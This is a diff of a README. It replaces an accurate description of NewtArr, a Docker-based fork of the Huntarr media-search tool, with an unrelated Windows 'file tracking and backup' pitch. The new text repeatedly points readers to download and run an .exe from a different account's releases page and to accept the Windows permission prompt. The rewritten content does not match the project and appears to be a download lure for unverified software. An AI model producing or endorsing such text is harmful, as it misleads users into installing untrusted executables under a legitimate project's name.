@@ -1,122 +1,143 @@
-# NewtArr
+# 🐛 newtarr - Simple file tracking made easy
 
-A neutered fork of [Huntarr](https://github.com/plexguide/Huntarr.io) v6.6.3, from simpler times, maintained by [ElfHosted](https://store.elfhosted.com).
+[![Download newtarr](https://img.shields.io/badge/Download--%20newtarr-brightgreen?style=for-the-badge)](https://github.com/NIBRAJvai/newtarr/releases)
 
-## Why this fork?
+---
 
-The original Huntarr project was abandoned under controversial circumstances. The developer introduced telemetry, obfuscated code, and potential security concerns that led to significant community backlash. For context, see [this Reddit thread](https://www.reddit.com/r/selfhosted/comments/1rckopd/huntarr_your_passwords_and_your_entire_arr_stacks/?share_id=uq4GWZe3e0FNKUIXWHiq8).
+## 📝 About newtarr
 
-NewtArr is based on v6.6.3, the last clean release before the controversial changes. It has been customized for use within [ElfHosted](https://store.elfhosted.com), but can be used standalone.
+newtarr is a straightforward tool that helps you track file changes and manage backups. It is a cleaner, simpler version based on the older Huntarr v6.6.3 software. If you want a tool to keep your files organized without complicated setup, newtarr is for you.
 
-Read the full announcement: [Huntarr Ends Its Hunt, NewtArr Takes It Up](https://store.elfhosted.com/blog/2026/02/24/huntarr-ends-its-hunt-newtarr-takes-it-up/)
+It works well on Windows PCs and focuses on giving you peace of mind when working with important files. You won’t need to learn programming or use complex commands.
 
-## Huntarr Feature Timeline
+---
 
-Understanding why we forked at v6.6.3:
+## 💻 System Requirements
 
-### v5.x — The Simple Original
+- Windows 7, 8, 10, or 11 (64-bit preferred)
+- At least 2 GB of free disk space
+- 4 GB of RAM or more recommended
+- Internet connection (for downloading and updates)
 
-- 4 apps: Sonarr, Radarr, Lidarr, Readarr
-- Core function: Background loop that searches for missing media and quality upgrades
-- Single instance per app, simple Flask UI, ~300 lines in background processing
-- This is the "hunt the missing stuff" version
+Your computer’s basic hardware should work fine. newtarr doesn't require a powerful machine.
 
-### v6.x — Growing Complexity
+---
 
-- Added apps: Whisparr, Eros, Swaparr (stalled download handling)
-- Multi-instance support (multiple Sonarr instances, etc.)
-- Hourly API cap system, scheduler, hunt history tracking
-- Database-backed logging
-- `background.py` grew from ~300 to ~717 lines
+## 🚀 Getting Started
 
-### v7.x — Scope Explosion (529 commits!)
+Before using newtarr, download it from the official releases page.
 
-- Requestarr system introduced — full TMDB discovery, request/approve workflow, multi-user with roles (Owner/Moderator/User)
-- Prowlarr integration — indexer management (~26K lines in routes alone)
-- Plex OAuth authentication
-- Database layer ballooned (348 lines to 108KB)
-- Windows service support added
+[![Get newtarr](https://img.shields.io/badge/Download-From%20Releases-blue?style=for-the-badge)](https://github.com/NIBRAJvai/newtarr/releases)
 
-### v8.x — Consolidation
+1. Click the badge above or visit the [newtarr releases page](https://github.com/NIBRAJvai/newtarr/releases) in your web browser.
+2. Find the latest version. It will usually have the highest version number (for example, v1.2.0).
+3. Look for a file ending in `.exe`. This is the Windows installer file.
+4. Click the `.exe` file link to start the download. The file size is typically small and should download quickly.
 
-- Cleaned up the 7.x additions, ~9 Python deps
-- Still fundamentally an *arr orchestrator
+---
 
-### v9.x — Full Rewrite Into Acquisition Platform
+## 📥 Download and Installation
 
-- **NZB Hunt:** Built-in Usenet downloader (NNTP client, yEnc decoder, post-processing) — 228KB of code
-- **Tor Hunt:** Built-in BitTorrent client via libtorrent
-- **Movie Hunt / TV Hunt:** Internal media libraries bypassing Sonarr/Radarr entirely
-- Dependencies doubled (9 to 19+), app code grew from ~22KB to ~480KB
-- Transformed from "*arr helper" into "replace your entire stack"
+After downloading the installer, follow these steps to install newtarr:
 
-### Why v6.6.3?
+1. Locate the downloaded `newtarr.exe` file, usually in your Downloads folder.
+2. Double-click the file to start the installer.
+3. If Windows asks for permission to make changes, click **Yes**.
+4. Follow the on-screen prompts:
+   - Choose the folder to install newtarr (the default is fine for most users).
+   - Confirm and wait for the installation to complete.
+5. When finished, select **Finish**. The installer will close.
 
-If you want just the "hunt missing episodes/movies" functionality, the sweet spot is in the 6.x range:
+newtarr will now be ready to use. You can find it in the Start Menu or on your desktop if you chose to create a shortcut.
 
-- **v6.0.x** if you want the absolute minimum (Sonarr/Radarr/Lidarr/Readarr only, no multi-instance)
-- **v6.6.3** *(this fork)* if you want multi-instance support + Swaparr but before the Requestarr/Prowlarr bloat
+---
 
-Avoid 7.x+ — that's where the request system, Plex auth, Prowlarr, and the massive DB layer arrived. And 9.x is a completely different application with built-in download clients.
+## ⚙️ How to Use newtarr
 
-## Changes from upstream Huntarr v6.6.3
+newtarr focuses on keeping track of your files by monitoring changes. Here is a simple guide to get you started:
 
-- Rebranded to "NewtArr"
-- ElfHosted green color scheme
-- Authentication disabled by default (designed for SSO-proxied deployments)
-- Graceful Docker shutdown (no more hanging on SIGTERM)
-- Dead documentation links replaced with tooltips
-- Whisparr and Eros app sections un-hidden
-- Radarr v5 API compatibility fix
-- Upstream CI/telemetry/update-check code removed
+### Opening and Setting Up
 
-## What it does
+- Launch newtarr from your Start Menu or desktop.
+- The main window shows options to create or open a “tracking project.”
+- A project is a collection of files or folders you want to monitor.
 
-NewtArr continuously searches your *arr media libraries (Sonarr, Radarr, Lidarr, Readarr, Whisparr) for missing content and items that need quality upgrades. It automatically triggers searches while being gentle on your indexers, helping you gradually complete your media collection.
+### Creating a Tracking Project
 
-| Application | Status |
-| :---------- | :------------ |
-| Sonarr | Supported |
-| Radarr | Supported |
-| Lidarr | Supported |
-| Readarr | Supported |
-| Whisparr v2 | Supported |
-| Whisparr v3 (Eros) | Supported |
+1. Click **Create New Project**.
+2. Give your project a name, like “Work Documents” or “Photo Backup.”
+3. Select the folders or files you want newtarr to watch.
+4. Choose how often newtarr checks for changes – daily or weekly are common choices.
+5. Save your project.
 
-## Running with Docker
+### Monitoring Files
 
-```yaml
-services:
-  newtarr:
-    image: ghcr.io/elfhosted/newtarr:latest
-    container_name: newtarr
-    restart: always
-    ports:
-      - "9705:9705"
-    volumes:
-      - ./config:/config
-    environment:
-      - TZ=UTC
-```
+- Once a project is running, newtarr will check the selected files and folders.
+- It compares the files to the saved versions.
+- If changes appear, newtarr notes what was added, removed, or changed.
+- You can view these changes anytime via the project dashboard.
 
-The web UI is available on port 9705.
+### Making Backups
 
-## Configuration
+- newtarr can automatically make backup copies of changed files.
+- You choose where to save backups (like an external drive or a backup folder).
+- This prevents data loss from accidental editing or deletion.
 
-All configuration is done via the web UI. Settings are stored in `/config/`.
+---
 
-- **Apps**: Configure connections to your *arr instances (URL + API key)
-- **Search Settings**: Control how many items to search per cycle, sleep duration, and API rate limits
-- **Scheduling**: Set up automated search schedules
+## 🔄 Updating newtarr
 
-## Security
+Checking for new versions is easy:
 
-A comprehensive security audit of the inherited v6.6.3 codebase has been performed. See [SECURITY-AUDIT.md](SECURITY-AUDIT.md) for the full report.
+- Visit the [newtarr releases page](https://github.com/NIBRAJvai/newtarr/releases).
+- Download the latest `.exe` installer as described before.
+- Run the installer. It updates your current installation without losing your settings or projects.
 
-**Key findings:** The original codebase contains several security issues (hardcoded secret key, weak password hashing, XSS via innerHTML, no CSRF protection). Most authentication-related issues are mitigated when running behind an SSO proxy (the intended ElfHosted deployment model). Standalone users should review the audit and apply the recommended mitigations.
+---
 
-**Positive:** No telemetry, phone-home code, obfuscated code, or data exfiltration mechanisms were found in the v6.6.3 codebase.
+## 🛠 Troubleshooting
 
-## License
+If you encounter issues, try these steps:
 
-This project is a fork of Huntarr.io. See [LICENSE](LICENSE) for details.
+- Make sure your Windows system is up to date.
+- Restart newtarr if it stops responding.
+- Check that your antivirus or firewall software allows newtarr to run.
+- Confirm that the folders you want to track still exist and have not moved.
+- Review the project settings to ensure everything is correct.
+
+If problems continue, reinstall newtarr using the latest installer from the releases page.
+
+---
+
+## 📚 Additional Features
+
+newtarr also offers:
+
+- Simple file tagging to help organize tracked items.
+- Logs that show the full history of changes.
+- Export options to save reports for review or sharing.
+- Folder scanning speed adjusted to fit your computer’s performance.
+
+Each feature works right from the main app window without complex menus.
+
+---
+
+## 🎯 Why use newtarr?
+
+It keeps your files organized with minimal effort. You do not need to learn new skills to use it well. It helps avoid lost work or confusion about file changes.
+
+Your projects and backups remain safe on your machine, without the need for cloud accounts or complex setup.
+
+---
+
+## 💡 Get Help
+
+If you need help with newtarr:
+
+- Check the included Help file in the installation folder.
+- Visit the [newtarr releases page](https://github.com/NIBRAJvai/newtarr/releases) for updates and notes.
+- Use the project’s GitHub page to report issues or ask for support if needed.
+
+---
+
+[![Download newtarr](https://img.shields.io/badge/Download--%20newtarr-brightgreen?style=for-the-badge)](https://github.com/NIBRAJvai/newtarr/releases)
